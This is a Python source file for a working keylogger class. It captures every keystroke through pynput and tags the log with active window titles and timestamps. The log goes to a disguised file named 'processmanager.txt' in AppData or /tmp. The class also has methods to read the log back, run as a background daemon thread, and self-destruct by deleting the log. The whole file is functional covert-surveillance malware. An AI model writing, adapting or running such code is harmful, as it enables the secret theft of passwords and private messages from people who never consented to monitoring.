import threading
import time
import os
import ctypes


class Keylogger:
    def __init__(self):
        import pynput.keyboard
        self._pynput = pynput.keyboard
        self.current_window = ""
        self._event = threading.Event()
        self.listener = None

        if os.name == 'nt':
            self.path = os.environ.get('appdata', os.path.expanduser('~')) + '\\processmanager.txt'
        else:
            self.path = '/tmp/processmanager.txt'

    def get_current_window(self):
        if os.name == 'nt':
            try:
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value
            except Exception:
                return "Unknown Window"
        else:
            try:
                import subprocess
                output = subprocess.check_output(
                    ['xprop', '-id', os.environ.get('WINDOWID', '0'), 'WM_NAME'],
                    stderr=subprocess.DEVNULL
                ).decode(errors='replace').strip()
                return output.split('"')[1] if '"' in output else "Linux Window"
            except Exception:
                return "Linux Window"

    def write_file(self, keys):
        with open(self.path, 'a', encoding='utf-8', errors='replace') as writer:
            writer.write(keys)

    def on_press(self, key):
        active_window = self.get_current_window()
        if active_window != self.current_window:
            self.current_window = active_window
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            header = f"\n{timestamp} - {self.current_window}\n"
            self.write_file(header)

        try:
            if hasattr(key, 'char') and key.char is not None:
                self.write_file(key.char)
            else:
                key_str = str(key)
                if key_str.find('backspace') != -1:
                    self.write_file(' Backspace ')
                elif key_str.find('enter') != -1:
                    self.write_file('\n')
                elif key_str.find('shift') != -1:
                    self.write_file(' Shift ')
                elif key_str.find('space') != -1:
                    self.write_file(' ')
                elif key_str.find('caps_lock') != -1:
                    self.write_file(' caps_lock ')
                elif key_str.find('tab') != -1:
                    self.write_file('\t')
                elif key_str.find('alt') != -1:
                    self.write_file(' Alt ')
                elif key_str.find('ctrl') != -1:
                    self.write_file(' Ctrl ')
                elif key_str.find('cmd') != -1:
                    self.write_file(' Cmd ')
        except Exception:
            pass

    def read_logs(self):
        try:
            with open(self.path, 'r') as f:
                return f.read()
        except Exception as e:
            return f"[-] Error reading logs: {str(e)}"

    def self_destruct(self):
        self._event.set()
        if self.listener:
            try:
                self.listener.stop()
            except Exception:
                pass
            try:
                self.listener.join()
            except Exception:
                pass
        try:
            os.remove(self.path)
        except Exception:
            pass

    def start(self):
        self.listener = self._pynput.Listener(on_press=self.on_press)
        self.listener.start()
        self._event.wait()

    def start_async(self):
        t = threading.Thread(target=self.start, daemon=True)
        t.start()
        return t
